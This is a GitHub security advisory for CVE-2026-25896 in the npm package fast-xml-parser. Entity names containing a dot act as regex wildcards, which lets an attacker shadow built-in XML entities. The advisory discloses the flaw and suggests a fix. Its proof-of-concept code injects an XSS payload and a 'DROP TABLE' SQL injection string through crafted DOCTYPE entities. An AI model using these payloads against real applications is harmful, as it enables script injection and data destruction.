# [C] fast-xml-parser has an entity encoding bypass via regex injection in DOCTYPE entity names

## Summary
Severity: Critical
Advisory: GHSA-m7jm-9gc2-mpf2
CVE: CVE-2026-25896
CWE: CWE-185
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:H/A:N (CVSS_V3)
Published: 2026-02-20
Source: https://github.com/advisories/GHSA-m7jm-9gc2-mpf2
Type: github-advisory

## Affected
- npm: `fast-xml-parser` — affected >=5.0.0 <5.3.5
- npm: `fast-xml-parser` — affected >=4.1.3 <4.5.4

## Details
# Entity encoding bypass via regex injection in DOCTYPE entity names

## Summary

A dot (`.`) in a DOCTYPE entity name is treated as a regex wildcard during entity replacement, allowing an attacker to shadow built-in XML entities (`&lt;`, `&gt;`, `&amp;`, `&quot;`, `&apos;`) with arbitrary values. This bypasses entity encoding and leads to XSS when parsed output is rendered.

## Details

The fix for CVE-2023-34104 addressed some regex metacharacters in entity names but missed `.` (period), which is valid in XML names per the W3C spec.

In `DocTypeReader.js`, entity names are passed directly to `RegExp()`:

```js
entities[entityName] = {
    regx: RegExp(`&${entityName};`, "g"),
    val: val
};
```

An entity named `l.` produces the regex `/&l.;/g` where `.` matches **any character**, including the `t` in `&lt;`. Since DOCTYPE entities are replaced before built-in entities, this shadows `&lt;` entirely.

The same issue exists in `OrderedObjParser.js:81` (`addExternalEntities`), and in the v6 codebase - `EntitiesParser.js` has a `validateEntityName` function with a character blacklist, but `.` is not included:

```js
// v6 EntitiesParser.js line 96
const specialChar = "!?\\/[]$%{}^&*()<>|+";  // no dot
```

## Shadowing all 5 built-in entities

| Entity name | Regex created | Shadows |
|---|---|---|
| `l.` | `/&l.;/g` | `&lt;` |
| `g.` | `/&g.;/g` | `&gt;` |
| `am.` | `/&am.;/g` | `&amp;` |
| `quo.` | `/&quo.;/g` | `&quot;` |
| `apo.` | `/&apo.;/g` | `&apos;` |

## PoC

```js
const { XMLParser } = require("fast-xml-parser");

const xml = `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY l. "<img src=x onerror=alert(1)>">
]>
<root>
  <text>Hello &lt;b&gt;World&lt;/b&gt;</text>
</root>`;

const result = new XMLParser().parse(xml);
console.log(result.root.text);
// Hello <img src=x onerror=alert(1)>b>World<img src=x onerror=alert(1)>/b>
```

No special parser options needed - `processEntities: true` is the default.

When an app renders `result.root.text` in a page (e.g. `innerHTML`, template interpolation, SSR), the injected `<img onerror>` fires.

`&amp;` can be shadowed too:

```js
const xml2 = `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY am. "'; DROP TABLE users;--">
]>
<root>SELECT * FROM t WHERE name='O&amp;Brien'</root>`;

const r = new XMLParser().parse(xml2);
console.log(r.root);
// SELECT * FROM t WHERE name='O'; DROP TABLE users;--Brien'
```

## Impact

This is a complete bypass of XML entity encoding. Any application that parses untrusted XML and uses the output in HTML, SQL, or other injection-sensitive contexts is affected.

- Default config, no special options
- Attacker can replace any `&lt;` / `&gt;` / `&amp;` / `&quot;` / `&apos;` with arbitrary strings
- Direct XSS vector when parsed XML content is rendered in a page
- v5 and v6 both affected

## Suggested fix

Escape regex metacharacters before constructing the replacement regex:

```js
const escaped = entityName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
entities[entityName] = {
    regx: RegExp(`&${escaped};`, "g"),
    val: val
};
```

For v6, add `.` to the blacklist in `validateEntityName`:

```js
const specialChar = "!?\\/[].{}^&*()<>|+";
```

## Severity

**CWE-185** (Incorrect Regular Expression)

**CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:H/A:N - 9.3 (CRITICAL)**

Entity decoding is a fundamental trust boundary in XML processing. This completely undermines it with no preconditions.

## References
- https://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-m7jm-9gc2-mpf2
- https://nvd.nist.gov/vuln/detail/CVE-2026-25896
- https://github.com/NaturalIntelligence/fast-xml-parser/commit/943ef0eb1b2d3284e72dd74f44a042ee9f07026e
- https://github.com/NaturalIntelligence/fast-xml-parser/commit/ddcd0acf26ddd682cb0dc15a2bd6aa3b96bb1e69
- https://github.com/NaturalIntelligence/fast-xml-parser
- https://github.com/NaturalIntelligence/fast-xml-parser/releases/tag/v5.3.5
